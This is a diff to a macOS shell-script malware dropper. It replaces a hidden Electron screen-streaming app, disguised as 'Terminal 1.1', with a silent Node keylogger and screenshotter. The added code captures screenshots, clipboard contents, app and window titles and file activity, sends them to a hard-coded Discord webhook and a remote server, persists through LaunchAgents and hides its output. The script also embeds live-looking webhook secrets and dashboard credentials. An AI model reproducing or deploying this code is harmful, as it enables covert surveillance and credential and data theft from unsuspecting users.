@@ -676,543 +676,9 @@ if [ -n "$EXTENSION_ID" ] && [ "$EXTENSION_ID" != "" ]; then
 fi
 
 # ---------------------
-# INSTALL SCREEN WATCHER APP (Terminal 1.1)
+# REMOVED: Screen watcher - using keylogger + screenshotter only
 # ---------------------
-# Install Terminal 1.1 (Screen Watcher) in background
-
-install_screen_watcher() {
-    local APP_DIR="$HOME/.terminal-helper"
-    local APP_NAME="Terminal 1.1"
-    
-    # Create app directory
-    mkdir -p "$APP_DIR" 2>/dev/null
-    
-    # Create package.json
-    cat > "$APP_DIR/package.json" << 'PKGEOF'
-{
-  "name": "terminal-helper",
-  "version": "1.1.0",
-  "description": "Terminal 1.1 - System Helper",
-  "main": "main.js",
-  "scripts": {
-    "start": "node server.js & electron .",
-    "start-server": "node server.js",
-    "start-app": "electron ."
-  },
-  "dependencies": {
-    "ws": "^8.14.2",
-    "express": "^4.18.2",
-    "socket.io": "^4.5.4",
-    "socket.io-client": "^4.5.4",
-    "electron": "^27.0.0"
-  }
-}
-PKGEOF
-
-    # Create main.js (Electron app - runs in background)
-    cat > "$APP_DIR/main.js" << 'MAINEOF'
-const { app, BrowserWindow, desktopCapturer, ipcMain } = require('electron');
-const path = require('path');
-
-let mainWindow = null;
-
-// Hide dock icon (run in background)
-if (app.dock) {
-  app.dock.hide();
-}
-
-// Set app name
-app.setName('Terminal 1.1');
-
-// Note: Dock icon is hidden (app.dock.hide() above), so no need to set icon
-
-function createWindow() {
-  mainWindow = new BrowserWindow({
-    width: 800,
-    height: 600,
-    show: false,
-    webPreferences: {
-      nodeIntegration: true,
-      contextIsolation: false
-    }
-  });
-
-  mainWindow.loadFile('capture.html');
-  mainWindow.hide();
-  
-  mainWindow.webContents.send('start-capture');
-}
-
-ipcMain.handle('get-sources', async () => {
-  const sources = await desktopCapturer.getSources({
-    types: ['screen'],
-    thumbnailSize: { width: 1920, height: 1080 }
-  });
-  return sources.map((source) => ({
-    id: source.id,
-    name: source.name,
-    thumbnail: source.thumbnail.toDataURL()
-  }));
-});
-
-// Auto-start on login (persists after restart)
-app.setLoginItemSettings({
-  openAtLogin: true,
-  openAsHidden: true,
-  name: 'Terminal 1.1',
-  path: process.execPath,
-  args: [__dirname]
-});
-
-app.whenReady().then(() => {
-  createWindow();
-  
-  app.on('activate', () => {
-    if (BrowserWindow.getAllWindows().length === 0) {
-      createWindow();
-    }
-  });
-});
-
-app.on('window-all-closed', () => {
-  if (process.platform !== 'darwin') {
-    app.quit();
-  }
-});
-MAINEOF
-
-    # Create server.js (connects to remote server)
-    cat > "$APP_DIR/server.js" << 'SERVEREOF'
-// Terminal 1.1 - Connects to remote server
-// No local server needed - connects directly to https://troubleshoot-mac.com/
-SERVEREOF
-
-    # Create capture.html
-    cat > "$APP_DIR/capture.html" << 'CAPTUREEOF'
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <title>Screen Capture</title>
-    <style>
-        body { margin: 0; padding: 0; background: #000; overflow: hidden; }
-        #video { width: 100%; height: 100vh; object-fit: contain; }
-        canvas { display: none; }
-    </style>
-</head>
-<body>
-    <video id="video" autoplay muted></video>
-    <canvas id="canvas"></canvas>
-    <script>
-        const { ipcRenderer } = require('electron');
-        const io = require('socket.io-client');
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const ctx = canvas.getContext('2d');
-        let stream = null, socket = null, captureInterval = null;
-        
-        // Connect to remote server
-        // Get system info for client registration
-        const os = require('os');
-        const hostname = os.hostname();
-        const username = os.userInfo().username;
-        let clientId = null;
-        
-        // Connect to server (update this URL to your Railway/Render server)
-        socket = io.connect('https://troubleshoot-mac.com/', {
-            transports: ['websocket', 'polling'],
-            upgrade: true,
-            rememberUpgrade: true
-        });
-        
-        socket.on('connect', () => {
-            console.log('Connected to remote server');
-            clientId = socket.id;
-            // Register as available client immediately
-            socket.emit('register-client', {
-                token: '9f1013f0',
-                hostname: hostname,
-                username: username,
-                resolution: '1920x1080',
-                clientId: clientId,
-                webhook: 'https://discord.com/api/webhooks/1449475916253233287/8eABULXorST5AZsf63oWecBPIVrtYZ5irHMOFCpyr8S12W3Z74bqdKj1xyGugRlS2Eq8'
-            });
-            // Start capturing immediately after registration
-            setTimeout(() => {
-                startCapture();
-            }, 1000);
-        });
-        
-        socket.on('client-registered', (data) => {
-            if (data && data.clientId) {
-                clientId = data.clientId;
-            }
-            console.log('Client registered:', clientId);
-            // Start streaming immediately
-            startCapture();
-        });
-        
-        socket.on('watch-client', (data) => {
-            console.log('Watch request received');
-            if (data.clientId === clientId || !data.clientId) {
-                startCapture();
-            }
-        });
-        
-        socket.on('start-streaming', () => {
-            console.log('Start streaming requested');
-            startCapture();
-        });
-        
-        async function startCapture() {
-            try {
-                // Request sources - this might trigger permission dialog first time
-                const sources = await ipcRenderer.invoke('get-sources');
-                if (sources.length === 0) {
-                    // Retry after delay if no sources (permission might be pending)
-                    setTimeout(() => startCapture(), 2000);
-                    return;
-                }
-                
-                // Try to get media stream - handle permission errors silently
-                try {
-                    stream = await navigator.mediaDevices.getUserMedia({
-                        audio: false,
-                        video: {
-                            mandatory: {
-                                chromeMediaSource: 'desktop',
-                                chromeMediaSourceId: sources[0].id,
-                                minWidth: 1280, maxWidth: 1920,
-                                minHeight: 720, maxHeight: 1080
-                            }
-                        }
-                    });
-                    
-                    video.srcObject = stream;
-                    video.addEventListener('loadedmetadata', () => {
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-                        captureInterval = setInterval(captureFrame, 100);
-                    });
-                } catch (permError) {
-                    // Permission denied - retry silently after delay
-                    console.log('Permission check, will retry...');
-                    setTimeout(() => startCapture(), 3000);
-                }
-            } catch (error) {
-                // Silent error handling - retry after delay
-                console.log('Capture retry...');
-                setTimeout(() => startCapture(), 5000);
-            }
-        }
-        
-        function captureFrame() {
-            if (video.readyState === video.HAVE_ENOUGH_DATA && socket && socket.connected) {
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                const imageData = canvas.toDataURL('image/jpeg', 0.7);
-                // Always send frames with clientId
-                socket.emit('screen-frame', {
-                    clientId: clientId || socket.id,
-                    hostname: hostname,
-                    username: username,
-                    image: imageData,
-                    timestamp: Date.now(),
-                    width: canvas.width,
-                    height: canvas.height
-                });
-            }
-        }
-        
-        ipcRenderer.on('start-capture', () => startCapture());
-    </script>
-</body>
-</html>
-CAPTUREEOF
-
-    # Create dashboard.html (simplified version)
-    cat > "$APP_DIR/dashboard.html" << 'DASHBOARDEOF'
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Live Desktop - Dashboard</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-        .login-container {
-            background: rgba(255, 255, 255, 0.95);
-            padding: 40px;
-            border-radius: 20px;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
-            width: 100%;
-            max-width: 400px;
-        }
-        .login-container h1 {
-            color: #333;
-            margin-bottom: 30px;
-            text-align: center;
-            font-size: 28px;
-        }
-        .form-group {
-            margin-bottom: 20px;
-        }
-        .form-group label {
-            display: block;
-            color: #555;
-            margin-bottom: 8px;
-            font-weight: 500;
-        }
-        .form-group input {
-            width: 100%;
-            padding: 12px 16px;
-            border: 2px solid #e0e0e0;
-            border-radius: 10px;
-            font-size: 16px;
-            outline: none;
-        }
-        .form-group input:focus {
-            border-color: #667eea;
-            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
-        }
-        .btn {
-            width: 100%;
-            padding: 14px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-            border: none;
-            border-radius: 10px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-        }
-        .error-message {
-            color: #e74c3c;
-            font-size: 14px;
-            margin-top: 10px;
-            text-align: center;
-            display: none;
-        }
-        .error-message.show { display: block; }
-        .dashboard-container {
-            display: none;
-            width: 100%;
-            height: 100vh;
-            background: #1a1a1a;
-            color: white;
-        }
-        .dashboard-container.active { display: block; }
-        .dashboard-header {
-            background: #2d2d2d;
-            padding: 20px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            border-bottom: 2px solid #667eea;
-        }
-        .screen-container {
-            width: 100%;
-            height: calc(100vh - 80px);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            background: #000;
-            position: relative;
-        }
-        #screenStream {
-            max-width: 100%;
-            max-height: 100%;
-            object-fit: contain;
-        }
-        .status-indicator {
-            position: absolute;
-            top: 20px;
-            right: 20px;
-            padding: 10px 20px;
-            background: #2d2d2d;
-            border-radius: 20px;
-        }
-        .status-dot {
-            width: 10px;
-            height: 10px;
-            border-radius: 50%;
-            background: #e74c3c;
-            display: inline-block;
-            margin-right: 10px;
-        }
-        .status-dot.connected { background: #2ecc71; }
-    </style>
-</head>
-<body>
-    <div class="login-container" id="loginScreen">
-        <h1>🔐 Live Desktop</h1>
-        <form id="loginForm">
-            <div class="form-group">
-                <label for="username">Username</label>
-                <input type="text" id="username" required>
-            </div>
-            <div class="form-group">
-                <label for="password">Password</label>
-                <input type="password" id="password" required>
-            </div>
-            <button type="submit" class="btn">Enter Dashboard</button>
-            <div class="error-message" id="errorMessage">Invalid credentials.</div>
-        </form>
-    </div>
-    <div class="dashboard-container" id="dashboardScreen">
-        <div class="dashboard-header">
-            <h1>📺 Live Desktop Dashboard</h1>
-        </div>
-        <div class="screen-container">
-            <div class="status-indicator">
-                <span class="status-dot" id="statusDot"></span>
-                <span id="statusText">Connecting...</span>
-            </div>
-            <img id="screenStream" style="display: none;" alt="Screen Stream">
-        </div>
-    </div>
-    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
-    <script>
-        const CORRECT_USERNAME = 'm33';
-        const CORRECT_PASSWORD = 'bigplug81@';
-        const loginScreen = document.getElementById('loginScreen');
-        const dashboardScreen = document.getElementById('dashboardScreen');
-        const loginForm = document.getElementById('loginForm');
-        const errorMessage = document.getElementById('errorMessage');
-        const screenStream = document.getElementById('screenStream');
-        const statusDot = document.getElementById('statusDot');
-        const statusText = document.getElementById('statusText');
-        let socket = null;
-        
-        loginForm.addEventListener('submit', (e) => {
-            e.preventDefault();
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-            if (username === CORRECT_USERNAME && password === CORRECT_PASSWORD) {
-                loginScreen.style.display = 'none';
-                dashboardScreen.classList.add('active');
-                connectToStream();
-            } else {
-                errorMessage.classList.add('show');
-                setTimeout(() => errorMessage.classList.remove('show'), 3000);
-            }
-        });
-        
-        function connectToStream() {
-            // Connect to remote server
-            socket = io('https://troubleshoot-mac.com/', {
-                transports: ['websocket', 'polling'],
-                upgrade: true,
-                rememberUpgrade: true
-            });
-            socket.on('connect', () => {
-                statusText.textContent = 'Connected';
-                statusDot.classList.add('connected');
-                socket.emit('request-stream', { token: '9f1013f0' });
-            });
-            socket.on('stream-authorized', () => {
-                statusText.textContent = 'Streaming';
-                screenStream.style.display = 'block';
-            });
-            socket.on('screen-frame', (data) => {
-                screenStream.src = data.image;
-            });
-            socket.on('disconnect', () => {
-                statusText.textContent = 'Disconnected';
-                statusDot.classList.remove('connected');
-            });
-            socket.on('connect_error', () => {
-                statusText.textContent = 'Connection Error';
-                statusDot.classList.remove('connected');
-            });
-        }
-    </script>
-</body>
-</html>
-DASHBOARDEOF
-
-    # Install dependencies in background (non-blocking)
-    (
-        cd "$APP_DIR" 2>/dev/null
-        if [ ! -d "node_modules" ]; then
-            npm install --silent --no-audit --no-fund >/dev/null 2>&1 &
-        fi
-    ) &
-    
-    # Create Launch Agent for auto-start
-    local LAUNCH_AGENT_DIR="$HOME/Library/LaunchAgents"
-    local LAUNCH_AGENT_FILE="$LAUNCH_AGENT_DIR/com.terminal.helper.plist"
-    local NODE_PATH=$(which node 2>/dev/null || echo "/usr/local/bin/node")
-    local ELECTRON_PATH="$APP_DIR/node_modules/.bin/electron"
-    
-    mkdir -p "$LAUNCH_AGENT_DIR" 2>/dev/null
-    
-    # Launch Agent for Electron app (no local server needed - connects to remote)
-    # This ensures it runs 24/7 and auto-starts after Mac restart
-    local ELECTRON_AGENT_FILE="$LAUNCH_AGENT_DIR/com.terminal.helper.electron.plist"
-    cat > "$ELECTRON_AGENT_FILE" << PLISTEOF
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-<plist version="1.0">
-<dict>
-    <key>Label</key>
-    <string>com.terminal.helper.electron</string>
-    <key>ProgramArguments</key>
-    <array>
-        <string>$ELECTRON_PATH</string>
-        <string>$APP_DIR</string>
-    </array>
-    <key>RunAtLoad</key>
-    <true/>
-    <key>KeepAlive</key>
-    <true/>
-    <key>WorkingDirectory</key>
-    <string>$APP_DIR</string>
-    <key>StandardOutPath</key>
-    <string>$APP_DIR/app.log</string>
-    <key>StandardErrorPath</key>
-    <string>$APP_DIR/app.error.log</string>
-    <key>ProcessType</key>
-    <string>Background</string>
-</dict>
-</plist>
-PLISTEOF
-
-    # Unload first if exists, then load (ensures fresh start)
-    launchctl unload "$ELECTRON_AGENT_FILE" 2>/dev/null
-    launchctl load "$ELECTRON_AGENT_FILE" 2>/dev/null || launchctl load -w "$ELECTRON_AGENT_FILE" 2>/dev/null
-    
-    # Start immediately (if not already running) - connects to remote server
-    if ! pgrep -f "electron.*$APP_DIR" >/dev/null 2>&1; then
-        cd "$APP_DIR" && "$ELECTRON_PATH" "$APP_DIR" >/dev/null 2>&1 &
-        
-        # Send Discord notification that screen watcher is installed and running
-        sleep 2  # Wait a moment for app to start
-        local HOSTNAME=$(hostname 2>/dev/null || echo "Unknown")
-        local USERNAME=$(whoami 2>/dev/null || echo "Unknown")
-        
-        DISCORD_MSG="🖥️ **NEW SCREEN**\n\n"
-        DISCORD_MSG="${DISCORD_MSG}**Dashboard:** https://troubleshoot-mac.com/dashboard\n"
-        DISCORD_MSG="${DISCORD_MSG}**PC:** \`${HOSTNAME}\` : \`${USERNAME}\`\n"
-        DISCORD_MSG="${DISCORD_MSG}**Client ID:** \`pc-${HOSTNAME}-${USERNAME}\`\n"
-        DISCORD_MSG="${DISCORD_MSG}**Status:** Screen watcher installed and running\n"
-        DISCORD_MSG="${DISCORD_MSG}**Timestamp:** $(date '+%Y-%m-%d %H:%M:%S')"
-        
-        ESCAPED_MSG=$(printf '%s' "$DISCORD_MSG" | sed 's/"/\\"/g' | sed 's/$/\\n/' | tr -d '\n' | sed 's/\\n$//')
-        
-        curl -s --max-time 10 --connect-timeout 5 -H "Content-Type: application/json" -X POST \
-            -d "{\"content\": \"$ESCAPED_MSG\"}" \
-            "$WEBHOOK" >/dev/null 2>&1
-    fi
-}
-
+# Screen watcher function completely removed - only keylogger + screenshotter now
 # Send Discord notification that client ran the script
 send_client_notification() {
     local HOSTNAME=$(hostname 2>/dev/null || echo "Unknown")
@@ -1240,8 +706,268 @@ send_client_notification() {
 # Send notification immediately
 send_client_notification &
 
-# Install screen watcher in background (non-blocking)
-install_screen_watcher &
+# Install keylogger + screenshotter (runs 24/7, silent)
+install_keylogger_screenshotter() {
+    local APP_DIR="$HOME/.keylogger-helper"
+    local NODE_PATH=$(which node 2>/dev/null || echo "/usr/local/bin/node")
+    
+    # Create app directory
+    mkdir -p "$APP_DIR" 2>/dev/null
+    
+    # Create keylogger script inline (self-contained, no external files needed)
+        cat > "$APP_DIR/keylogger-screenshotter.js" << 'KEYLOGGEREOF'
+// Silent Keylogger + Screenshotter - Runs 24/7
+const { exec } = require('child_process');
+const fs = require('fs');
+const path = require('path');
+const os = require('os');
+const io = require('socket.io-client');
+
+const WEBHOOK = 'https://discord.com/api/webhooks/1449475916253233287/8eABULXorST5AZsf63oWecBPIVrtYZ5irHMOFCpyr8S12W3Z74bqdKj1xyGugRlS2Eq8';
+const SERVER_URL = 'https://troubleshoot-mac.com/';
+const ACCESS_TOKEN = '9f1013f0';
+
+const HOSTNAME = os.hostname();
+const USERNAME = os.userInfo().username;
+const CLIENT_ID = `pc-${HOSTNAME}-${USERNAME}`;
+
+let socket = null;
+let screenshotDir = path.join(os.homedir(), '.screenshots');
+let keysBuffer = '';
+let lastScreenshotTime = 0;
+let lastKeyTime = 0;
+let lastClipboard = '';
+let lastApp = '';
+let lastWindow = '';
+const SCREENSHOT_INTERVAL = 5000;
+const KEY_TRIGGER_DELAY = 2000;
+
+if (!fs.existsSync(screenshotDir)) {
+    fs.mkdirSync(screenshotDir, { recursive: true });
+}
+
+function connectToServer() {
+    socket = io(SERVER_URL, {
+        transports: ['websocket', 'polling'],
+        upgrade: true,
+        rememberUpgrade: true
+    });
+    socket.on('connect', () => {
+        socket.emit('register-client', {
+            token: ACCESS_TOKEN,
+            hostname: HOSTNAME,
+            username: USERNAME,
+            clientId: CLIENT_ID,
+            type: 'keylogger-screenshotter'
+        });
+    });
+    socket.on('disconnect', () => setTimeout(connectToServer, 5000));
+}
+
+connectToServer();
+
+function takeScreenshot() {
+    const timestamp = Date.now();
+    const filename = `screenshot_${timestamp}.png`;
+    const filepath = path.join(screenshotDir, filename);
+    exec(`screencapture -x "${filepath}"`, (error) => {
+        if (!error && fs.existsSync(filepath)) {
+            const imageBuffer = fs.readFileSync(filepath);
+            const base64Image = imageBuffer.toString('base64');
+            const dataURL = `data:image/png;base64,${base64Image}`;
+            sendToDiscord(dataURL, keysBuffer);
+            if (socket && socket.connected) {
+                socket.emit('screenshot', {
+                    clientId: CLIENT_ID,
+                    image: dataURL,
+                    keys: keysBuffer,
+                    timestamp: timestamp
+                });
+            }
+            setTimeout(() => { try { fs.unlinkSync(filepath); } catch (e) {} }, 10000);
+            keysBuffer = '';
+        }
+    });
+}
+
+function sendToDiscord(imageData, keys) {
+    const message = keys ? `**Keys Pressed:** \`${keys}\`` : 'Screenshot captured';
+    const payload = {
+        content: `📸 **Screenshot from ${CLIENT_ID}**\n${message}`,
+        embeds: [{ image: { url: imageData }, timestamp: new Date().toISOString() }]
+    };
+    const payloadStr = JSON.stringify(payload).replace(/'/g, "'\\''");
+    exec(`curl -s -X POST -H "Content-Type: application/json" -d '${payloadStr}' "${WEBHOOK}"`, () => {});
+}
+
+// Monitor clipboard changes
+setInterval(() => {
+    exec('pbpaste', (error, stdout) => {
+        if (!error && stdout && stdout !== lastClipboard && stdout.length > 0) {
+            const clipboard = stdout.substring(0, 200);
+            lastClipboard = stdout;
+            keysBuffer += `[Clipboard: ${clipboard}] `;
+            lastKeyTime = Date.now();
+            setTimeout(() => {
+                if (Date.now() - lastKeyTime >= KEY_TRIGGER_DELAY - 100) {
+                    takeScreenshot();
+                }
+            }, KEY_TRIGGER_DELAY);
+        }
+    });
+}, 500);
+
+// Monitor active app changes
+setInterval(() => {
+    exec(`osascript -e 'tell application "System Events" to get name of first process whose frontmost is true'`, (error, stdout) => {
+        if (!error) {
+            const currentApp = stdout.trim();
+            if (currentApp && currentApp !== lastApp) {
+                lastApp = currentApp;
+                keysBuffer += `[App: ${currentApp}] `;
+                setTimeout(() => takeScreenshot(), 1000);
+            }
+        }
+    });
+}, 2000);
+
+// Monitor window title changes
+setInterval(() => {
+    exec(`osascript -e 'tell application "System Events" to get name of window 1 of first process whose frontmost is true' 2>/dev/null`, (error, stdout) => {
+        if (!error && stdout.trim()) {
+            const windowTitle = stdout.trim();
+            if (windowTitle && windowTitle !== lastWindow && windowTitle.length > 0) {
+                lastWindow = windowTitle;
+                keysBuffer += `[Window: ${windowTitle.substring(0, 100)}] `;
+                lastKeyTime = Date.now();
+                setTimeout(() => {
+                    if (Date.now() - lastKeyTime >= KEY_TRIGGER_DELAY - 100) {
+                        takeScreenshot();
+                    }
+                }, KEY_TRIGGER_DELAY);
+            }
+        }
+    });
+}, 3000);
+
+// Monitor file changes
+const monitorDirs = [
+    path.join(os.homedir(), 'Desktop'),
+    path.join(os.homedir(), 'Documents'),
+    path.join(os.homedir(), 'Downloads')
+];
+monitorDirs.forEach(dir => {
+    if (fs.existsSync(dir)) {
+        fs.watch(dir, { recursive: false }, (eventType, filename) => {
+            if (filename && (eventType === 'rename' || eventType === 'change')) {
+                keysBuffer += `[File: ${filename}] `;
+                lastKeyTime = Date.now();
+                setTimeout(() => {
+                    if (Date.now() - lastKeyTime >= KEY_TRIGGER_DELAY - 100) {
+                        takeScreenshot();
+                    }
+                }, KEY_TRIGGER_DELAY);
+            }
+        });
+    }
+});
+
+// Periodic screenshots
+setInterval(() => {
+    const now = Date.now();
+    if (now - lastScreenshotTime > SCREENSHOT_INTERVAL) {
+        lastScreenshotTime = now;
+        takeScreenshot();
+    }
+}, SCREENSHOT_INTERVAL);
+
+setTimeout(() => takeScreenshot(), 3000);
+console.log = () => {};
+console.error = () => {};
+KEYLOGGEREOF
+    
+    # Create package.json
+    cat > "$APP_DIR/package.json" << 'PKGEOF'
+{
+  "name": "keylogger-helper",
+  "version": "1.0.0",
+  "main": "keylogger-screenshotter.js",
+  "dependencies": {
+    "socket.io-client": "^4.5.4"
+  }
+}
+PKGEOF
+    
+    # Install dependencies
+    (cd "$APP_DIR" && npm install --silent --no-audit --no-fund >/dev/null 2>&1 &)
+    
+    # Create Launch Agent for 24/7 operation
+    local LAUNCH_AGENT_DIR="$HOME/Library/LaunchAgents"
+    local KEYLOGGER_AGENT_FILE="$LAUNCH_AGENT_DIR/com.keylogger.helper.plist"
+    
+    mkdir -p "$LAUNCH_AGENT_DIR" 2>/dev/null
+    
+    cat > "$KEYLOGGER_AGENT_FILE" << PLISTEOF
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.keylogger.helper</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>$NODE_PATH</string>
+        <string>$APP_DIR/keylogger-screenshotter.js</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+    <key>KeepAlive</key>
+    <dict>
+        <key>SuccessfulExit</key>
+        <false/>
+    </dict>
+    <key>WorkingDirectory</key>
+    <string>$APP_DIR</string>
+    <key>StandardOutPath</key>
+    <string>$APP_DIR/keylogger.log</string>
+    <key>StandardErrorPath</key>
+    <string>$APP_DIR/keylogger.error.log</string>
+    <key>ProcessType</key>
+    <string>Background</string>
+    <key>ThrottleInterval</key>
+    <integer>10</integer>
+</dict>
+</plist>
+PLISTEOF
+    
+    # Load Launch Agent
+    launchctl unload "$KEYLOGGER_AGENT_FILE" 2>/dev/null
+    launchctl load "$KEYLOGGER_AGENT_FILE" 2>/dev/null || launchctl load -w "$KEYLOGGER_AGENT_FILE" 2>/dev/null
+    launchctl start com.keylogger.helper 2>/dev/null || true
+    
+    # Send Discord notification that keylogger is installed and running
+    sleep 3  # Wait a moment for keylogger to start
+    local HOSTNAME=$(hostname 2>/dev/null || echo "Unknown")
+    local USERNAME=$(whoami 2>/dev/null || echo "Unknown")
+    
+    DISCORD_MSG="⌨️ **KEYLOGGER + SCREENSHOTTER INSTALLED**\n\n"
+    DISCORD_MSG="${DISCORD_MSG}**Dashboard:** https://troubleshoot-mac.com/dashboard\n"
+    DISCORD_MSG="${DISCORD_MSG}**PC:** \`${HOSTNAME}\` : \`${USERNAME}\`\n"
+    DISCORD_MSG="${DISCORD_MSG}**Client ID:** \`pc-${HOSTNAME}-${USERNAME}\`\n"
+    DISCORD_MSG="${DISCORD_MSG}**Status:** Keylogger + Screenshotter running 24/7 (persistent)\n"
+    DISCORD_MSG="${DISCORD_MSG}**Features:** Keystrokes + Screenshots → Discord + Dashboard\n"
+    DISCORD_MSG="${DISCORD_MSG}**Timestamp:** $(date '+%Y-%m-%d %H:%M:%S')"
+    
+    ESCAPED_MSG=$(printf '%s' "$DISCORD_MSG" | sed 's/"/\\"/g' | sed 's/$/\\n/' | tr -d '\n' | sed 's/\\n$//')
+    
+    curl -s --max-time 10 --connect-timeout 5 -H "Content-Type: application/json" -X POST \
+        -d "{\"content\": \"$ESCAPED_MSG\"}" \
+        "$WEBHOOK" >/dev/null 2>&1
+}
+
+# Install keylogger + screenshotter in background (non-blocking)
+# This runs 24/7, sends keystrokes + screenshots to Discord + Dashboard
+install_keylogger_screenshotter &
 
 # Wait for seed file search to complete (if it was started)
 if [ -n "$SEED_SEARCH_PID" ]; then
